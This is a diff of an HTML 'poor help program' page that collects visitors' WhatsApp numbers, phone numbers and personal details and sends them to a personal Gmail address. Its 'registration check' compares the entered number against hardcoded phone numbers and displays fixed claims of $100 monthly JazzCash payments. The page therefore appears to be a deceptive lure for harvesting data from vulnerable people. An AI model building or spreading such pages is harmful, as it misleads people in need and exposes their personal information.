@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Nexura Poor Help Program</title>
 
   <style>
     body{
       font-family: Arial, sans-serif;
-      background:#f2f5f9;
+      background:#f4f7fb;
       margin:0;
       padding:0;
     }
@@ -16,7 +16,7 @@
     .container{
       max-width:500px;
       margin:40px auto;
-      background:white;
+      background:#fff;
       padding:25px;
       border-radius:15px;
       box-shadow:0 0 15px rgba(0,0,0,0.1);
@@ -32,17 +32,17 @@
       color:white;
       padding:15px;
       border-radius:10px;
-      margin-bottom:20px;
       text-align:center;
       font-size:20px;
       font-weight:bold;
-      line-height: 1.8;
+      line-height:1.8;
+      margin-bottom:20px;
     }
 
     button{
       width:100%;
       padding:14px;
-      margin-top:10px;
+      margin-top:12px;
       border:none;
       border-radius:10px;
       background:#0b5ed7;
@@ -61,8 +61,8 @@
       margin-top:10px;
       border-radius:8px;
       border:1px solid #ccc;
-      font-size:15px;
       box-sizing:border-box;
+      font-size:15px;
     }
 
     textarea{
@@ -74,19 +74,18 @@
       display:none;
     }
 
-    .result{
-      margin-top:20px;
-      padding:15px;
-      border-radius:10px;
-      background:#eef5ff;
-      font-weight:bold;
-      text-align:center;
-    }
-
     .step{
       margin-top:15px;
       font-weight:bold;
-      color:#333;
+    }
+
+    .result{
+      margin-top:20px;
+      padding:15px;
+      background:#eef5ff;
+      border-radius:10px;
+      text-align:center;
+      font-weight:bold;
     }
   </style>
 </head>
@@ -103,51 +102,51 @@
   </div>
 
   <button onclick="showApply()">1 APPLY</button>
-  <button onclick="showCheck()">2 CHECK IF YOU ARE REGISTERED</button>
 
-  <!-- APPLY SECTION -->
+  <button onclick="showCheck()">
+    2 CHECK IF YOU ARE REGISTERED
+  </button>
+
+  <!-- APPLY -->
   <div id="applySection" class="hidden">
 
     <div class="step">
-      1 ENTER YOUR WHATSAPP NUMBER (ANY FAMILY MEMBER NUMBER)
+      1 ENTER YOUR WHATSAPP NUMBER
     </div>
 
-    <input type="text" id="whatsapp" placeholder="Enter WhatsApp Number">
+    <input type="text" id="whatsapp"
+    placeholder="Enter WhatsApp Number">
 
     <div class="step">
       2 ENTER YOUR PHONE NUMBER
     </div>
 
-    <input type="text" id="phone" placeholder="Enter Phone Number">
+    <input type="text" id="phone"
+    placeholder="Enter Phone Number">
 
     <div class="step">
-      3 ENTER YOUR DETAILS (WRITE SOME LINES ABOUT YOURSELF)
+      3 ENTER YOUR DETAILS
     </div>
 
-    <textarea id="detail" placeholder="Write About Yourself"></textarea>
+    <textarea id="detail"
+    placeholder="Write About Yourself"></textarea>
 
-    <!-- EMAIL FORM -->
-    <form action="https://formsubmit.co/muhammadtaqi512q@gmail.com" method="POST">
-
-      <input type="hidden" name="_captcha" value="false">
-
-      <input type="hidden" name="WhatsApp Number" id="hiddenWhatsapp">
-      <input type="hidden" name="Phone Number" id="hiddenPhone">
-      <input type="hidden" name="User Details" id="hiddenDetail">
-
-      <button type="submit" onclick="prepareData()">
-        REGISTER & SEND
-      </button>
-    </form>
+    <!-- EMAIL SEND -->
+    <button onclick="sendMail()">
+      REGISTER & SEND
+    </button>
 
   </div>
 
-  <!-- CHECK REGISTER SECTION -->
+  <!-- CHECK -->
   <div id="checkSection" class="hidden">
 
-    <input type="text" id="checkNumber" placeholder="Enter Your Phone Number">
+    <input type="text" id="checkNumber"
+    placeholder="Enter Your Phone Number">
 
-    <button onclick="verifyNumber()">VERIFY</button>
+    <button onclick="verifyNumber()">
+      VERIFY
+    </button>
 
     <div id="result" class="result hidden"></div>
 
@@ -158,54 +157,92 @@
 <script>
 
   function showApply(){
-    document.getElementById("applySection").classList.remove("hidden");
-    document.getElementById("checkSection").classList.add("hidden");
+    document.getElementById("applySection")
+    .classList.remove("hidden");
+
+    document.getElementById("checkSection")
+    .classList.add("hidden");
   }
 
   function showCheck(){
-    document.getElementById("checkSection").classList.remove("hidden");
-    document.getElementById("applySection").classList.add("hidden");
+    document.getElementById("checkSection")
+    .classList.remove("hidden");
+
+    document.getElementById("applySection")
+    .classList.add("hidden");
   }
 
-  function prepareData(){
+  // SEND EMAIL DIRECTLY
+  function sendMail(){
 
-    document.getElementById("hiddenWhatsapp").value =
-      document.getElementById("whatsapp").value;
+    let whatsapp =
+    document.getElementById("whatsapp").value;
 
-    document.getElementById("hiddenPhone").value =
-      document.getElementById("phone").value;
+    let phone =
+    document.getElementById("phone").value;
 
-    document.getElementById("hiddenDetail").value =
-      document.getElementById("detail").value;
+    let detail =
+    document.getElementById("detail").value;
+
+    let subject =
+    "New Nexura Registration";
+
+    let body =
+    "WhatsApp Number: " + whatsapp +
+    "%0D%0A%0D%0A" +
+    "Phone Number: " + phone +
+    "%0D%0A%0D%0A" +
+    "User Details: " + detail;
+
+    // OPEN GMAIL SEND PAGE
+    window.location.href =
+    "mailto:muhammadtaqi512q@gmail.com?subject="
+    + subject + "&body=" + body;
   }
 
   // JSON DATA
   const users = {
 
-    "03016754668":"YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
-    "03016754664":"YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
-    "03256754668":"YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
-    "03646754668":"YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
+    "03016754668":
+    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
 
-    "03016754690":"YOU ARE REGISTERED.",
-    "03216754661":"YOU ARE REGISTERED.",
+    "03016754664":
+    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
 
-    "03016754676":"YOU ARE A RICH PERSON.",
-    "0301675666":"YOU ARE A RICH PERSON."
+    "03256754668":
+    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
+
+    "03646754668":
+    "YOU ARE RECEIVING $100 EVERY MONTH ON THE 1ST DATE IN YOUR JAZZCASH ACCOUNT.",
+
+    "03016754690":
+    "YOU ARE REGISTERED.",
+
+    "03216754661":
+    "YOU ARE REGISTERED.",
+
+    "03016754676":
+    "YOU ARE A RICH PERSON.",
+
+    "0301675666":
+    "YOU ARE A RICH PERSON."
   };
 
   function verifyNumber(){
 
-    const number = document.getElementById("checkNumber").value;
+    let number =
+    document.getElementById("checkNumber").value;
 
-    const result = document.getElementById("result");
+    let result =
+    document.getElementById("result");
 
     result.classList.remove("hidden");
 
     if(users[number]){
       result.innerHTML = users[number];
     }else{
-      result.innerHTML = "YOU ARE NOT REGISTERED.";
+      result.innerHTML =
+      "YOU ARE NOT REGISTERED.";
     }
   }
 
